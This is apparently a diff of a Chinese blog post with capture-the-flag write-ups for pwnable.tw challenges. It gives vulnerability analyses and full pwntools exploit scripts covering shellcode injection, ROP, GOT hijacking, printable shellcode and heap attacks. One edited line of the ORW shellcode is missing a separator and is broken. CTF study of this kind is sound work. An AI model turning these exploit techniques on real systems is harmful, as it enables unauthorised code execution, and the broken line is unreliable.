@@ -10,73 +10,55 @@ an interesting trip
 <!--more-->
 
 # Start
-    checksec发现保护都没开，应该是直接写shellcode然后ret2shellcode的类型
-    then 用 gdb 的pattc/patto 测ret's offset：20
-        同时发现程序比较小只有两部分
-        （应该是直接的汇编程序）
-        1.输出 
-        2.写入（长度不限 20byte 溢出）
-    但是因为需要ret 到stack上所以需要泄露栈地址
-    于是乎就通过第一次输出ret到输出之前输出栈上的内容 经过测试发现
-    ret 0x8048087可以泄露栈内容
-    这里需要注意用send而不是sendline（如果不利用输出的第一个地址也可以用sendline）
-    因为sendline会覆盖泄露的内容的最低字节导致计算不准（我就在这里百思不得其解后来才发现、、、）
-    然后计算的出shellcode's address
+
+checksec发现保护都没开，应该是直接写shellcode然后ret2shellcode。
     
-    EXP:
-    ```python
-    from pwn import *
-    context.log_level='debug'
-    shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
-    #p=remote("chall.pwnable.tw",10000)
-    print len(shellcode)
-    p=process("./start")
-    print p.recvuntil(":")
-    raw_input() 
-    p.sendline("".ljust(20,'x')+p32(0x8048087))
-    data=p.recv()
-    leak=(u32(data[:4]))
-    print hex(leak)
-    sleep(1)
-    p.sendline('a'*20+p32(leak+20)+shellcode)
-    ```
+EXP:
+```python
+from pwn import *
+context.log_level='debug'
+shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+#p=remote("chall.pwnable.tw",10000)
+print len(shellcode)
+p=process("./start")
+print p.recvuntil(":")
+raw_input() 
+p.sendline("".ljust(20,'x')+p32(0x8048087))
+data=p.recv()
+leak=(u32(data[:4]))
+print hex(leak)
+sleep(1)
+p.sendline('a'*20+p32(leak+20)+shellcode)
+```
    
 # ORW
-    checksec之后依然什么保护都没开于是丢进了IDA
-    ![](./2018-6-1-1.png)
-    line5:写入一个0xc8长度的shellcode到&shellcode
-    line6:call shellcode
-    然后line3函数中比较重要的部分是prctl
-    [prctl.h][1]
-    发现这个函数使用了PR_GET_NO_NEW_PRIVS 避免安全漏洞
-    白名单：open，read，write
-    于是我们可以写shellcode：
-    open /home/orw/flag
-    read flag
-    write flag
-    
-    HERE is EXP:
-    ```python
-    from pwn import *
-    shellcode = ''
-    shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')
-    shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')
-    shellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')
-    context.log_level='debug'
-    #p=process("./orw")
-    p=remote('chall.pwnable.tw',10001)
-    a=p.recvuntil("code:")
-    print a
-    p.send(shellcode)
-    data=p.recvrepeat(2)
-    print data
-    ```
+checksec之后依然什么保护都没开于是丢进了IDA
+发现使用了PR_GET_NO_NEW_PRIVS 避免安全漏洞，白名单：open，read，write
+于是我们可以写shellcode：
+open /home/orw/flag
+read flag
+write flag
+
+```python
+from pwn import *
+shellcode = ''
+shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6fpush 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')
+shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')
+shellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')
+context.log_level='debug'
+#p=process("./orw")
+p=remote('chall.pwnable.tw',10001)
+a=p.recvuntil("code:")
+print a
+p.send(shellcode)
+data=p.recvrepeat(2)
+print data
+```
+
 # calc
-之前一直嫌麻烦没做...本来想着一个小时左右写掉...没想到耗了我...3个小时写exp....
-tcl
-tcl
-## analysis
-主要的漏洞存在于pool这个结构体和他的计算过程...
+之前一直嫌麻烦没做...本来想着一个小时左右写掉...没想到耗了我...3个小时写exp....
+
+主要的漏洞存在于pool这个结构体和他的计算过程...
 ```c
 struct pool
 {
@@ -114,14 +96,14 @@ pool *__cdecl eval(pool *pool, char op)
   return result;
 }
 ```
-计算过程是先找到离当前位置最近的符号然后调用eval主要的问题是没考虑符号开头的输入，如果遇到符号开头的输入就会把idx改变掉然后后面的计算可能会造成任意地址写
+计算过程是先找到离当前位置最近的符号然后调用eval主要的问题是没考虑符号开头的输入，如果遇到符号开头的输入就会把idx改变掉然后后面的计算可能会造成任意地址写
 例如`+100+1`
-思路就是做ROP...记得ROPgadget有个打stack link 的程序很好用的命令忘记了...然后写exp写了3个小时...
+思路就是做ROP...记得ROP_gadget有个打stack link 的程序很好用的命令忘记了...然后写exp写了3个小时...
 遇到如下问题
 * `sys_execv('sh')`没用一定要是`/bin/sh`而且没有...
 * 不能输入字符`0`
 
-采用的方法是read进一个`/bin/sh`用int0x80拿shell
+采用的方法是read进一个`/bin/sh`用int0x80拿shell
 ## exp
 ```python
 from pwn import *
@@ -153,9 +135,7 @@ p.interactive()
 # dubblesort
 本题有越界写但是因开着canary所以无法直接改掉ret_address
 需要一个关于__isoc99_scanf的技巧
-
-__isoc99_scanf skill...
-    输入+-时不改变栈上值也可以被%u吸收
+__isoc99_scanf skill... 输入+-时不改变栈上值也可以被%u吸收
 
 ## 漏洞点
 * 开始的时候有overflow可以泄露libc地址
@@ -164,6 +144,7 @@ __isoc99_scanf skill...
 ## 利用
 * 泄露libc
 * 利用—+构造rop
+
 ## EXP
 ```python
 from pwn import *
@@ -209,7 +190,7 @@ p.sendlineafter("number : ",str(sh))
 
 p.interactive()
 ```
-* ps:玄学问题...我输入34个不成功...execve的环境变量可能有问题 输入35个最后一个用sh地址盖掉就成功了....
+ps:玄学问题...我输入34个不成功...execve的环境变量可能有问题 输入35个最后一个用sh地址盖掉就成功了....
 
 
 # hacknote
@@ -280,7 +261,7 @@ strncat(s, &buf, 0x30 - *((_DWORD *)s + 12));
 strncat如果填满会在size位填上0覆盖掉之前的size造成第二次利用升级功能时会溢出
 ## 思路
 * 创建，升级造成溢出
-* 构造rop泄露地址
+* 构造rop泄露地址
 * 打怪退出 得到泄露 返回main
 * 以上再做一次get shell
 
@@ -320,6 +301,7 @@ p.interactive("nier >>>>")
 ```
 
 # seethefile
+
 IO_FILE 利用
 ## Analysis
 主要功能是读文件然后留下姓名走人....
@@ -371,8 +353,10 @@ p.sendafter("eave your name :",payload+"\n")
 p.interactive()
 ```
 # applestore
-一开始以为是uninitialize 后来发现并不能利用...在网上看了老师傅们的wp发现是和之前一题一样做的stack migration.
-把栈移到got上这样就可以利用开始的my_read和atoig去getshell
+
+一开始以为是uninitialize 后来发现并不能利用...在网上看了师傅们的wp发现是和之前一题一样做的stack migration.
+把栈移到got上这样就可以利用开始的my_read和atoig去getshell
+
 ## analysis
 情境应该是apple商店可以买apple产品到购物车，购物车里的apple产品是以双链表的形式储存结构如下
 ```c
@@ -384,20 +368,20 @@ phone
     phone * pre; 
 }
 ```
-一个比较有趣的点是只要消费满7174 进入checkout 就会赠送一美元一个的iPhone8
-这个iphone比较有关键它是在stack上的这样的话我们的链表会指向栈上而栈可以被我们控制(输入index的时候有15bytes)我们就可以干些事情
+一个比较有趣的点是只要消费满7174 进入checkout 就会赠送一美元一个的iPhone8
+这个iphone比较有关键它是在stack上的这样的话我们的链表会指向栈上而栈可以被我们控制(输入index的时候有15bytes)我们就可以干些事情
 ## 利用思路
 
-* 先买到iphone8
-* 利用delect里的输入覆盖掉iphone8的name 泄露libc & stack 
-* 构造一个fake phone如下
+* 先买到iphone8
+* 利用delect里的输入覆盖掉iphone8的name 泄露libc & stack 
+* 构造一个fake phone如下
 ```c
 name = 0xdeadbeef
 price= 0xdeadbeef
 next = &ebp-12
 pre  = atoi_got+0x22
 ```
-* 利用delect 掉iphone 8 进行swap,进入handle之后ebp变成atoi_got +0x22 
+* 利用delect 掉iphone 8 进行swap,进入handle之后ebp变成atoi_got +0x22 
 * 利用my_read 做got hijacking
 * 利用read_cmd getshell:p64(system)+";"+"/bin/sh;"
 
@@ -473,9 +457,9 @@ if ( idx > 10 )
     RWX:      Has RWX segments
 
 ```
-所以可以写改写(add)某个函数的`got`然后就通过call那个函数直接跳我们的输入了
+所以可以写改写(add)某个函数的`got`然后就通过call那个函数直接跳我们的输入了
 漏洞点比较简单..主要是可显示字符的限制
-于是乎先去找可显示字符的机器码..找到了某个大佬归纳的资料
+于是乎先去找可显示字符的机器码..找到了某个大佬归纳的资料
 ```sh
 1.数据传送:
 push/pop eax…
@@ -552,7 +536,7 @@ xor [eax], esi ; esi = 0
 
 然后经过长时间探索...我的方法最终成功了刚刚看了看大家的我感觉我的shellcode还是挺短的
 
-* int 0x80通过sub byte ptr[eax + 0x23] , dl来获得(先pop eax得到一个heap上地址 然后可以对其做一些操作变成自己想要的值 dl通过 push pop 来设置)例如:
+* int 0x80通过sub byte ptr[eax + 0x23] , dl来获得(先pop eax得到一个heap上地址 然后可以对其做一些操作变成自己想要的值 dl通过 push pop 来设置)例如:
 ```s
 sub al,0x2e
 sub byte ptr[eax + 0x23] , dl
@@ -563,9 +547,9 @@ sub byte ptr[eax + 0x22] , dl
 pop edx
 ```
 * 为了更容易得到sh我改写的是free的got
-* 实地考察发现在call free的时候ebx=0& ecx=0 & eax=address_of_/bin/sh
+* 实地考察发现在call free的时候ebx=0& ecx=0 & eax=address_of_/bin/sh
 * 所以我们只需要用push pop sub搞出个0xb就可以了
-具体shellcode如下
+具体shellcode如下
 ```python
 shellcode='''
 push eax
@@ -647,7 +631,7 @@ add(1,"/bin/sh\n")
 free(1)
 p.interactive()
 ```
-手撸可见字符的shellcode挺有意思的
+手撸可见字符的shellcode挺有意思的
 
 # Spirited Away
 神寻...谷歌翻译 挺给力的...结果居然变成了千与千寻...
@@ -779,7 +763,7 @@ house of spirit 应该是从这里来吧...
     FORTIFY:  Enabled
 
 ```
-秘密花园...常规的`double free`...做到堆题感觉比前面简单多了...看来我的stack方面或者漏洞挖掘方面太弱了
+秘密花园...常规的`double free`...做到堆题感觉比前面简单多了...看来我的stack方面或者漏洞挖掘方面太弱了
 花的结构体
 ```c
 struct Flower{
@@ -797,8 +781,8 @@ struct Flower{
     result = puts("Successful");
   }
 ```
-可以`double_free`
-泄露地址因为read的时候没有截断直接free进`unsorted bin`然后malloc出来show出来就可以了
+可以`double_free`
+泄露地址因为read的时候没有截断直接free进`unsorted bin`然后malloc出来show出来就可以了
 
 ## 思路
 * leak libc
@@ -856,7 +840,7 @@ p.interactive()
 ```
 
 # Babystack
-
+
 ```
 ➜  Desktop checksec babystack
 [*] '/home/n132/Desktop/babystack'
@@ -883,17 +867,17 @@ int __fastcall check(const char *sec)
   return puts("Login Success !");
 }
 ```
-首先是登录.因为这里用的len是我们输入的len所以我们可以用00截断例如输入'\x00'我们就可以根据返回来爆破随机数
+首先是登录.因为这里用的len是我们输入的len所以我们可以用00截断例如输入'\x00'我们就可以根据返回来爆破随机数
 
 然后是复制功能复制的时候用了`strcpy(a1, &src);`
-而且src没有初始化所以我们可以先在check里面在栈上留下东西然后会在strcpy的时候也一同复制过去
+而且src没有初始化所以我们可以先在check里面在栈上留下东西然后会在strcpy的时候也一同复制过去
 
 ## 思路
-* 通过爆破获得随机数（为了绕最后的类似canary）
-* 通过未初始化变量和strcpy做buffer overflow
-* 因为地址无法将8字节填满所以只能使用一个地址因为没有后门然后又提供了libc所以就去找泄露跳one_gadget
-* 没有输出点但是可以通过吧一些东西移到本来是随机数的地方然后爆破出来
-* 恰好strcpy之后移上去的后8字节是libc内地址爆出来之后跳one_gadget
+* 通过爆破获得随机数（为了绕最后的类似canary）
+* 通过未初始化变量和strcpy做buffer overflow
+* 因为地址无法将8字节填满所以只能使用一个地址因为没有后门然后又提供了libc所以就去找泄露跳one_gadget
+* 没有输出点但是可以通过吧一些东西移到本来是随机数的地方然后爆破出来
+* 恰好strcpy之后移上去的后8字节是libc内地址爆出来之后跳one_gadget
 ## exp
 ```python
 from pwn import *
@@ -949,7 +933,7 @@ p.sendline("cat /home/babystack/flag")
 p.interactive()
 #0x7fffffffdd80
 ```
-远端非常慢....挑早上打。。还是能成功的
+远端非常慢....挑早上打。。还是能成功的
 
 # alive_note
 在Death_note上升级的一道题
@@ -968,8 +952,8 @@ edx=xx
 ```
 设置寄存器如果数字较小的话我们可以直接inc上去比较大的话我们push 进去之后pop 出来
 
-改写free_got所以eax是将要被free的地址
-我们可以set为ecx的值
+改写free_got所以eax是将要被free的地址
+我们可以set为ecx的值
 
 * int 0x80也就是\xcd\x80需要自己通过运算得出
 还好xor [reg+0x??],reg还是可以用的
@@ -1075,13 +1059,13 @@ p.interactive(">> nier ")
 
 * set_name的时候可以泄露heap地址后来发现没什么用...反正后面可以泄露
 
-* edit存在bytes_off,可以edit两次来更改下一个chunk的head
+* edit存在bytes_off,可以edit两次来更改下一个chunk的head
 
-一开始看到了没有free 想到了sysmalloc 和house of orange 但是感觉pwnable.tw应该没有那么快就orange了..于是乎想用force来做.于是探索了半天发现输入函数的atoi决定了不能用hose of force...
+一开始看到了没有free 想到了sysmalloc 和house of orange 但是感觉pwnable.tw应该没有那么快就orange了..于是乎想用force来做.于是探索了半天发现输入函数的atoi决定了不能用hose of force...
 
 ## 思路
-house of orange
-* sysmalloc 获得一个unsorted bin（大一点可以同时泄露heap和libc_base）
+house of orange
+* sysmalloc 获得一个unsorted bin（大一点可以同时泄露heap和libc_base）
 * leak libc&heap
 * house of orange
 ## exp
